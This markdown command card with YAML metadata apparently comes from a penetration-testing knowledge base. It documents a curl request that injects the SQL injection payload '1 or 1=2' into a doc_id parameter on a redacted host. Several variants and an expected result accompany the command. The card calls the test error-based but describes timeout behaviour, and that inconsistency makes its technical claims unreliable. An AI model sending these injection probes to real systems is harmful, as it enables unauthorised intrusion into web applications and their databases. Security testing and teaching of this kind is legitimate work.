---
data: >-
  curl -X GET "https://████/library.php?path=test&doc_id=1 or 1=2" --max-time 60
  -v
tags:
  - error-based
  - sqli
type: command
output: null
executor: bash
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.213Z'
id: 3086830c-faa1-41b0-bdd2-bb5cc41eeabc
verified: false
validated: true
submitted: true
---
# sqli-error-based-or-1-equals-2-test

## Command

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 or 1=2" --max-time 60 -v
```

## Description

Sends an error-based SQLi payload with a false condition to cause a request hang or timeout.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| doc_id | '1 or 1=2' payload | Yes |
| --max-time 60 | Allow for potential hangs | Yes |
| -v | Verbose output | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 or 1=2" --max-time 60 -v
```

### Advanced Usage

```bash
curl -X GET "https://████/library.php?path=test&doc_id=1 or 1=2" --max-time 60 -v -H "Accept: text/html"
```

## Expected Output

Request hangs or times out after 60s, with no response body, indicating query execution.

## Related

- [[procedures/Confirm-SQLi-with-Error-Based-Payloads]]
